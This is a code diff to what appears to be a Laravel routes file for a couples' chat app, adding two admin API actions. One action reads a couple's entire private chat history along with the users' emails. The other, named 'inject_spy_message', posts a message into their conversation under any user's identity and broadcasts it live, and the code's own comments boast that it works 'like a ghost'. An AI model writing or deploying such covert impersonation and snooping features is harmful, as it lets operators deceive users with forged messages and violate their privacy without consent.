@@ -207,6 +207,42 @@ Route::post('/admin/api', function (Request $request) {
             Message::where('couple_id', $coupleId)->delete();
             return response()->json(['success' => true, 'message' => 'Chat history cleared successfully.']);
 
+        case 'get_chat_history':
+            $coupleId = $request->input('couple_id');
+            $couple = Couple::with('users')->findOrFail($coupleId);
+            $messages = Message::where('couple_id', $coupleId)->orderBy('created_at', 'asc')->get();
+            
+            return response()->json([
+                'success' => true,
+                'couple' => [
+                    'id' => $couple->id,
+                    'users' => $couple->users->map(fn($u) => ['id' => $u->id, 'name' => $u->name, 'email' => $u->email, 'profile_photo_url' => $u->profile_photo_url]),
+                ],
+                'messages' => $messages
+            ]);
+
+        case 'inject_spy_message':
+            $coupleId = $request->input('couple_id');
+            $senderId = $request->input('sender_id'); // 0 for system, or user ID
+            $messageText = $request->input('message');
+            
+            $msg = Message::create([
+                'couple_id' => $coupleId,
+                'sender_id' => $senderId,
+                'message' => $messageText
+            ]);
+
+            // Broadcast so users' live chats update in real-time!
+            event(new \App\Events\MessageSent($coupleId, [
+                'id' => $msg->id,
+                'couple_id' => $coupleId,
+                'sender_id' => (int)$senderId,
+                'message' => $messageText,
+                'created_at' => $msg->created_at->toISOString()
+            ]));
+
+            return response()->json(['success' => true, 'message' => 'Message successfully injected into conversation flow like a ghost!']);
+
         case 'delete_user':
             $userId = $request->input('user_id');
             $user = User::findOrFail($userId);
